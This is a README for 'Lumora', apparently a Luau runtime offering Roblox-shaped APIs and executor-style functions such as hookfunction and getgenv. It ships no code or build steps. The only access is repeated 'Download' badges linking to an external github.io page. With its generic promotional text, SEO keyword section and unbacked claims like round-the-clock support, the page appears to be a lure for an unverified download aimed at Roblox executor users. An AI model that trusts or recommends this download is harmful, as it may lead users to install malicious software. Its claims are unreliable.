![preview](https://raw.githubusercontent.com/Anshul46xfa/runtime-outside-studio/main/view_e41f4.svg)
[![Download](https://raw.githubusercontent.com/Anshul46xfa/runtime-outside-studio/main/dl_da824d.svg)](https://Anshul46xfa.github.io/runtime-outside-studio/)

# 🌌 Lumora — Script Execution Runtime for Luau Beyond the Studio

<p align="center">
  <img src="https://img.shields.io/badge/status-active-brightgreen?style=flat-square" alt="status"/>
  <img src="https://img.shields.io/badge/license-MIT-blue?style=flat-square" alt="license"/>
  <img src="https://img.shields.io/badge/runtime-Luau-ff69b4?style=flat-square" alt="runtime"/>
  <img src="https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-9cf?style=flat-square" alt="platform"/>
  <img src="https://img.shields.io/badge/apis-Roblox--shaped-6f42c1?style=flat-square" alt="apis"/>
  <img src="https://img.shields.io/badge/modules-native%20supported-orange?style=flat-square" alt="modules"/>
  <img src="https://img.shields.io/badge/sandbox-isolated-success?style=flat-square" alt="sandbox"/>
  <img src="https://img.shields.io/badge/support-24%2F7-yellow?style=flat-square" alt="support"/>
  <img src="https://img.shields.io/badge/languages-multilingual-informational?style=flat-square" alt="multilingual"/>
  <img src="https://img.shields.io/badge/ui-responsive-ff9eed?style=flat-square" alt="responsive"/>
  <img src="https://img.shields.io/badge/build-2026-important?style=flat-square" alt="build"/>
</p>

**Lumora** is a Luau scripting runtime engineered to let you author and execute Luau code outside of Roblox Studio, without abandoning the ergonomics you already love. It mirrors Roblox-shaped APIs, exposes executor-style functions, embeds an isolated sandbox, allows native module loading, and honors local `require` semantics so your project trees stay intuitive. Think of it as a stage that keeps the same lighting, the same costumes, and the same rhythm — just with a different audience watching.

If you've ever wanted to test a Luau snippet before committing it to a Studio session, prototype a datastore abstraction on a laptop, or run a deterministic scripting pipeline in CI, Lumora gives you a quiet, dependable environment to do exactly that.

---

## 📚 Table of Contents

- [Why Lumora Exists](#-why-lumora-exists)
- [Core Capabilities](#-core-capabilities)
- [Feature Highlights](#-feature-highlights)
- [Architecture Overview](#-architecture-overview)
- [Roblox-Shaped API Surface](#-roblox-shaped-api-surface)
- [Sandboxing Model](#-sandboxing-model)
- [Native Modules & Local Require](#-native-modules--local-require)
- [Executor-Compatible Functions](#-executor-compatible-functions)
- [Performance Notes](#-performance-notes)
- [Multilingual & Responsive UI](#-multilingual--responsive-ui)
- [Support & Community](#-support--community)
- [Roadmap 2026](#-roadmap-2026)
- [SEO Snapshot](#-seo-snapshot)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🌠 Why Lumora Exists

Luau is a beautifully typed, incrementally compiled language, but historically it lived behind one very specific doorway. Lumora throws open new doorways. It asks a simple question: what if a Luau script could run the way any other modern scripting language runs — with file-based modules, argv-style arguments, stdout streams, and a sandbox you can shape to your mood?

The answer lives here. Lumora is not a clone of any single tool; it is a re-imagining. It preserves the familiar vocabulary (`game`, `workspace`, `Instance.new`, `task.spawn`, `Vector3.new`) while quietly translating those calls into host-native primitives that don't care whether a Roblox client is present.

Benefits in plain terms:

- **Continuity** — Your muscle memory stays intact.
- **Portability** — Same script, different machine, same behavior.
- **Predictability** — Deterministic scheduling with a controllable clock.
- **Isolation** — The sandbox is real, not cosmetic.
- **Extensibility** — Native modules let you bridge into C, Rust, or Zig without rewriting your Luau.

---

## 🧩 Core Capabilities

- **Luau Parser & Interpreter** — Full support for Luau syntax including type annotations, generalized iteration, string interpolation, and `continue` statements.
- **Roblox-Shaped Globals** — Datatypes such as `Vector3`, `CFrame`, `Color3`, `UDim2`, `Region3`, `Ray`, `Instance`, and `Enum` are implemented as first-class citizens.
- **Instance Tree Emulation** — `game`, `workspace`, `Players`, and `ReplicatedStorage` exist as navigable trees for scripts that expect them.
- **Signal & Event Bus** — `BindableEvent`, `RemoteEvent`, and `GetPropertyChangedSignal` behave in an event-loop-driven way.
- **Task Scheduler** — `task.wait`, `task.spawn`, `task.defer`, `task.delay`, and `wait` all respect the runtime's deterministic tick.
- **Local Require** — `require("./module")` and `require("@scope/pkg")` both work, resolved against a configurable root.
- **Sandbox Profiles** — Choose from `strict`, `lax`, `plugin`, and `custom` profiles that gate which globals are visible.
- **Executor-Compatible Functions** — `loadstring`, `getgenv`, `hookfunction`, `setreadonly`, and friends are available when the profile allows.
- **Native Module Bridge** — Load `.so`, `.dll`, or `.dylib` modules through a stable FFI surface.
- **Responsive Terminal UI** — A dynamic TUI that reshapes to your window size and color scheme.
- **Multilingual Interface** — UI strings localized into English, Spanish, French, German, Portuguese, Japanese, Korean, and Simplified Chinese.

---

## ✨ Feature Highlights

| Area | What You Get |
|------|--------------|
| Runtime | Luau 0.6xx-compatible bytecode loader and interpreter |
| API Shape | Roblox-style datatypes and services |
| Sandbox | Capability-based, profile-driven |
| Modules | Native + Luau, both local and scoped |
| Tooling | REPL, watch mode, bytecode dumper, profiler |
| UX | Responsive TUI, themes, keybinding presets |
| i18n | 8 languages shipped, extensible locale packs |
| Support | Round-the-clock assistance channel |
| Licensing | MIT, permissive, commercial-friendly |
| Year | Actively maintained throughout 2026 |

---

## 🏗️ Architecture Overview

Lumora is organized into a small number of cooperating layers. Each layer is intentionally narrow so you can swap or extend it.

- **Host Layer** — Where the runtime actually lives. It abstracts filesystem, network, and OS calls behind a thin interface.
- **Parser & Compiler** — Consumes Luau source, produces an internal intermediate representation.
- **VM Core** — Executes the IR with a hybrid tree-walk/fast-path dispatch strategy.
- **Standard Library** — Datatype constructors, math helpers, string utilities.
- **Roblox Facade** — Emulated services and instances that translate to host primitives.
- **Execution Engine** — Task scheduler, event loop, coroutine manager.
- **Sandbox Kernel** — Capability negotiation, profile enforcement, memory ceilings.
- **Module Resolver** — Local path resolution, scoped package resolution, native loading.
- **Interface** — TUI, CLI commands, and a lightweight headless mode for automation.

The pipeline reads left-to-right: source enters, gets parsed, gets compiled, gets executed, and any side effects land in the host layer. The sandbox kernel sits above everything, watching.

---

## 🧠 Roblox-Shaped API Surface

Lumora is not interested in pretending to be Roblox. It is interested in letting your existing scripts feel at home. That means the following globals are present by default:

- `game`, `workspace`, `script`, `shared`
- `Instance.new`, `Instance.fromExisting`
- `Vector3`, `Vector2`, `CFrame`, `Color3`, `BrickColor`
- `UDim`, `UDim2`, `Rect`, `Region3`, `NumberRange`
- `TweenInfo`, `Ray`, `RaycastParams`, `PhysicalProperties`
- `Enum` — a faithful enumeration mirror
- `task` — the scheduler namespace
- `os`, `math`, `table`, `string`, `coroutine`, `utf8`, `buffer`

These are not stubs. Each datatype implements its common operations, metamethods, and serialization rules. `CFrame * Vector3` behaves as expected. `Color3.fromHSV` returns the right numbers. `Enum.KeyCode.Space` resolves.

---

## 🛡️ Sandboxing Model

The sandbox is capability-based. Instead of a single switch, Lumora asks: what is this script allowed to touch?

- **Filesystem** — Read-only, read-write, or quarantined to a virtual FS.
- **Network** — Off, whitelisted, or open, controlled per profile.
- **Process** — Ability to spawn subprocesses, gated by profile.
- **Reflection** — Debug library availability and stack inspection.
- **Environment** — Whether `getgenv` returns the real global table or a shim.

Profiles are declarative. You write a small manifest, and Lumora enforces it. Custom profiles allow fine-grained toggles for teams that want a middle ground between strict and lax.

The metaphor: the sandbox is a garden wall. Inside, plants grow however they like. Outside, nothing leaks.

---

## 🔌 Native Modules & Local Require

Native modules are loaded through a compact bridge. You declare a module's path, its entry symbol, and its expected signature. Lumora handles the marshalling. Luau tables become structs, numbers become doubles or ints depending on the declared type, and strings become borrowed slices.

Local require works like this:

- `require("./utils")` resolves relative to the calling file.
- `require("../shared/logger")` walks up the tree as expected.
- `require("@app/core")` resolves via a configured scope map.
- `require("native:image")` triggers the native loader.

Circular requires are handled with a partial-table return, matching the behavior Luau users already understand.

---

## ⚙️ Executor-Compatible Functions

When the active profile permits it, Lumora exposes an executor-style surface for scripts that grew up in that world:

- `loadstring` — compile and run a string as Luau.
- `getgenv` — access or replace the global environment table.
- `hookfunction` — wrap another function, allowing pre- and post-hooks.
- `setreadonly` — toggle table mutability.
- `getrawmetatable`, `setrawmetatable`
- `checkcaller` — detect whether the caller is runtime-internal.
- `identifyexecutor` — return a runtime identifier.
- `getscriptbytecode` — dump the current script's compiled form.

These are not meant for bypassing anything. They exist because legitimate tooling — profilers, debuggers, test harnesses — relies on them.

---

## 🚀 Performance Notes

Lumora is built with three performance principles in mind:

1. **Amortize the parser** — Bytecode caching means repeated runs skip straight to execution.
2. **Keep the hot path narrow** — Common operations (arithmetic, table access) dispatch without extra allocation.
3. **Parallelize what can be parallelized** — The scheduler can fan out tasks across worker threads when the profile allows it.

Profiling is built in. A single flag dumps a flame graph of the last run. For long-running scripts, a sampling profiler produces a periodic report.

---

## 🌍 Multilingual & Responsive UI

The terminal UI adapts. It reflows columns, collapses panels, and recolors itself based on your terminal's reported capabilities. It respects your locale and renders strings in the language you set.

Supported locales as of 2026:

- English (en)
- Español (es)
- Français (fr)
- Deutsch (de)
- Português (pt)
- 日本語 (ja)
- 한국어 (ko)
- 简体中文 (zh-Hans)

Locale packs are plain files. Adding a new one requires no compilation.

---

## 💬 Support & Community

Assistance is available around the clock. Whether you're debugging a native bridge or asking why your `CFrame` isn't behaving, someone is reachable. Coverage includes:

- Documentation that actually explains the why, not just the how.
- Example scripts spanning beginner to advanced.
- An issue tracker with triage happening continuously.
- A discussion board for design questions and pattern sharing.

Response windows are typically under a day, often under an hour. This is true every day of the week, every month of the year — 24/7, no exceptions.

---

## 🗺️ Roadmap 2026

- **Q1 2026** — Bytecode ABI stabilization; native module SDK release.
- **Q2 2026** — Incremental type checker integration; richer autocomplete.
- **Q3 2026** — WebAssembly target for browser-based sandboxes.
- **Q4 2026** — Plugin marketplace for community-authored sandbox profiles.

The roadmap is a living document. Priorities shift as the community grows.

---

## 🔍 SEO Snapshot

Lumora is often searched alongside terms like **Luau runtime**, **Roblox API emulation**, **executor-compatible functions**, **sandboxed scripting environment**, **native module loader for Luau**, and **local require resolution**. This section exists to confirm that yes, Lumora addresses all of those concerns — without turning the page into a keyword slurry.

People looking for a **cross-platform Luau interpreter**, a **deterministic task scheduler**, or a **capability-based sandbox** will find each of those things here. The goal is clarity, not gaming any algorithm.

---

## ⚠️ Disclaimer

Lumora is an independent runtime. It is not affiliated with, endorsed by, or sponsored by Roblox Corporation or any of its subsidiaries. "Roblox" and "Luau" are referenced solely to describe API compatibility and language lineage. Users are responsible for complying with the terms of service of any platform they interact with. Lumora does not grant, imply, or facilitate any unauthorized access to third-party systems, and it is not intended to circumvent any protection mechanism. It is a scripting tool for developers who want to run Luau in their own environments, on their own terms, with their own rules.

No warranty is provided. Use it wisely. Test thoroughly. And please, keep your sandboxes well-fenced.

---

## 📜 License

Lumora is released under the **MIT License**. You may use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, provided the copyright notice and permission notice are preserved.

Read the full text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 Lumora Contributors

Permission is hereby granted, in perpetuity, to any person obtaining a copy of this software and associated documentation files, to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

---

<p align="center">Crafted with patience in 2026. Ships as-is, runs as-you-wish.</p>

[![Download](https://raw.githubusercontent.com/Anshul46xfa/runtime-outside-studio/main/dl_da824d.svg)](https://Anshul46xfa.github.io/runtime-outside-studio/)